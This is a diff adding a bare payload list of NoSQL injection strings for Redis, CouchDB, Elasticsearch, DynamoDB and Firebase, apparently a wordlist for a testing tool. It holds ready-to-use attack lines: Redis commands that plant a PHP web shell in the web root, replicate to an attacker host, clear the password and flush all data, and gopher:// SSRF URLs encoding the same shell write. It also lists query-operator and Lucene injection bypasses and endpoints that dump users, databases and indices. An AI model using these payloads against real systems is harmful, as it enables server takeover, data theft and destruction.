@@ -1,0 +1,66 @@
+# ============================================================
+# NoSQL Injection — Redis, CouchDB, Elasticsearch
+# ============================================================
+
+# ---- Redis Command Injection ----
+# Via HTTP parameters that become Redis commands:
+PING
+SET key value
+GET key
+KEYS *
+CONFIG GET dir
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SET webshell "<?php system($_GET['c']); ?>"
+SAVE
+BGSAVE
+SLAVEOF ATTACKER 6379
+CONFIG SET requirepass ""
+FLUSHALL
+DEBUG SLEEP 10
+
+# ---- Redis SSRF (via SSRF vulnerability) ----
+# gopher:// protocol to send raw Redis commands:
+gopher://127.0.0.1:6379/_PING
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
+gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%246%0D%0Abackup%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%0A%0A%0D%0A
+
+# ---- CouchDB Injection ----
+# Default admin credentials
+/_users/_all_docs
+/_users/org.couchdb.user:admin
+/_config/admins/newadmin
+# GET /_all_dbs
+/_all_dbs
+/_session
+/_utils
+
+# ---- CouchDB Query Operator Injection ----
+{"selector": {"$or": [{"_id": {"$gt": ""}}, {"type": "user"}]}}
+{"selector": {"type": "user", "password": {"$regex": "^a"}}}
+
+# ---- Elasticsearch Injection ----
+# Lucene query injection:
+" OR 1=1
+" AND 1=0 OR 1=1
+* OR 1=1
+admin" OR "1"="1
+
+# ---- Elasticsearch HTTP API ----
+/_cat/indices?v
+/_cat/nodes?v
+/_cluster/health
+/_nodes/stats
+/_all/_search
+/_search?q=*:*
+/_search?pretty&size=1000
+
+# ---- DynamoDB Injection ----
+{"FilterExpression": "username = :u OR :u = :u", ":u": {"S": "admin"}}
+
+# ---- Firestore / Firebase ----
+# URL: https://target.firebaseio.com/.json
+/.json
+/users.json
+/admin.json
+/config.json?auth=LEAKED_TOKEN
